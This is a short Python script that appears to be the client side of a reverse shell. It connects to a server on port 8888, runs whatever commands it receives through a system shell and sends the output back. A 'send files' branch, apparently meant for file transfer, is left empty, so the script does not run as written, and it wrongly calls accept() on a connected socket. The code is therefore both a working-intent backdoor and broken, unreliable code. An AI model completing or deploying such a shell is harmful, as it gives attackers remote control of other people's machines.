import socket
import os
import subprocess
SIZE = 1048576
FORMAT = "utf-8"
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

def client():
    s = socket.socket()
    host = "127.0.0.1"
    port = 8888

    s.connect((host, port))
    client_socket,address=s.accept()
    while True:
        data = s.recv(1048576)
        if data.decode("utf-8") == "send files":
           
        else:
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
        

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                current_wd = os.getcwd() + "$ "
                s.send(str.encode(output_str + current_wd))
                print(output_str)


client()
